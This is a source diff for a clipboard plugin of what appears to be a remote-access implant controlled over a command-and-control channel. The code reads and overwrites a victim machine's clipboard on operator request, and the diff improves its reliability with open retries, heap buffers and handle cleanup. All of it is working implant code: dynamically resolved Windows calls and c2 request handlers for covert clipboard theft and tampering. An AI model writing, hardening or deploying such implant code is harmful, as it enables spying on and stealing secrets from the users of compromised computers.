@@ -64,8 +64,10 @@ typedef BOOL    (WINAPI *fn_EmptyClipboard)(void);
 typedef HANDLE  (WINAPI *fn_GetClipboardData)(UINT);
 typedef HANDLE  (WINAPI *fn_SetClipboardData)(UINT, HANDLE);
 typedef HGLOBAL (WINAPI *fn_GlobalAlloc)(UINT, SIZE_T);
+typedef HGLOBAL (WINAPI *fn_GlobalFree)(HGLOBAL);
 typedef LPVOID  (WINAPI *fn_GlobalLock)(HGLOBAL);
 typedef BOOL    (WINAPI *fn_GlobalUnlock)(HGLOBAL);
+typedef void    (WINAPI *fn_Sleep)(DWORD);
 
 static struct
 {
@@ -75,26 +77,32 @@ static struct
     fn_GetClipboardData pGetClipboardData;
     fn_SetClipboardData pSetClipboardData;
     fn_GlobalAlloc      pGlobalAlloc;
+    fn_GlobalFree       pGlobalFree;
     fn_GlobalLock       pGlobalLock;
     fn_GlobalUnlock     pGlobalUnlock;
+    fn_Sleep            pSleep;
 } w;
 
 /* ------------------------------------------------------------------ */
 /* Inline helpers                                                      */
 /* ------------------------------------------------------------------ */
 
-static __inline size_t cot_strlen(const char *s)
+/* Try to open the clipboard with retries.
+ * OpenClipboard(NULL) can fail transiently when another process
+ * holds the clipboard lock. */
+static __inline BOOL clipboard_open(int retries)
 {
-    size_t n = 0;
-    while (s[n]) n++;
-    return n;
-}
+    int i;
 
-static __inline void cot_memcpy(void *dst, const void *src, size_t n)
-{
-    volatile unsigned char *d = (volatile unsigned char *)dst;
-    const unsigned char *s2 = (const unsigned char *)src;
-    while (n--) *d++ = *s2++;
+    for (i = 0; i < retries; i++)
+    {
+        if (w.pOpenClipboard(NULL))
+            return TRUE;
+
+        w.pSleep(50);
+    }
+
+    return FALSE;
 }
 
 /* ------------------------------------------------------------------ */
@@ -107,7 +115,7 @@ static tlv_pkt_t *clipboard_get(c2_t *c2)
     HANDLE hData;
     char *text;
 
-    if (!w.pOpenClipboard(NULL))
+    if (!clipboard_open(10))
     {
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
@@ -137,36 +145,65 @@ static tlv_pkt_t *clipboard_get(c2_t *c2)
 
 static tlv_pkt_t *clipboard_set(c2_t *c2)
 {
-    char data[65536];
+    /* Heap-allocate the receive buffer to avoid a 64 KB stack frame.
+     * In a COT plugin the MinGW cross-compiler may not emit __chkstk,
+     * so a large stack allocation can jump past the guard page and
+     * cause an access-violation. */
+    char *data;
     HGLOBAL hMem;
     char *pMem;
     size_t len;
 
-    if (tlv_pkt_get_string(c2->request, TLV_TYPE_CLIP_DATA, data) <= 0)
+    data = (char *)malloc(65536);
+    if (data == NULL)
     {
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
-    if (!w.pOpenClipboard(NULL))
+    if (tlv_pkt_get_string(c2->request, TLV_TYPE_CLIP_DATA, data) <= 0)
     {
+        free(data);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
+
+    if (!clipboard_open(10))
+    {
+        free(data);
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
     w.pEmptyClipboard();
 
-    len = cot_strlen(data) + 1;
+    len = strlen(data) + 1;
     hMem = w.pGlobalAlloc(0x0002 /* GMEM_MOVEABLE */, len);
     if (hMem == NULL)
     {
         w.pCloseClipboard();
+        free(data);
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
     pMem = (char *)w.pGlobalLock(hMem);
-    cot_memcpy(pMem, data, len);
-    w.pGlobalUnlock(hMem);
+    if (pMem == NULL)
+    {
+        w.pGlobalFree(hMem);
+        w.pCloseClipboard();
+        free(data);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
 
-    w.pSetClipboardData(CF_TEXT, hMem);
+    memcpy(pMem, data, len);
+    w.pGlobalUnlock(hMem);
+    free(data);
+
+    if (w.pSetClipboardData(CF_TEXT, hMem) == NULL)
+    {
+        /* SetClipboardData failed — we still own the handle */
+        w.pGlobalFree(hMem);
+        w.pCloseClipboard();
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
+
     w.pCloseClipboard();
 
     return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
@@ -186,6 +223,8 @@ COT_ENTRY
     w.pGlobalAlloc      = (fn_GlobalAlloc)cot_resolve("kernel32.dll", "GlobalAlloc");
     w.pGlobalLock       = (fn_GlobalLock)cot_resolve("kernel32.dll", "GlobalLock");
     w.pGlobalUnlock     = (fn_GlobalUnlock)cot_resolve("kernel32.dll", "GlobalUnlock");
+    w.pGlobalFree       = (fn_GlobalFree)cot_resolve("kernel32.dll", "GlobalFree");
+    w.pSleep            = (fn_Sleep)cot_resolve("kernel32.dll", "Sleep");
 
     api_call_register(api_calls, CLIPBOARD_GET, (api_t)clipboard_get);
     api_call_register(api_calls, CLIPBOARD_SET, (api_t)clipboard_set);
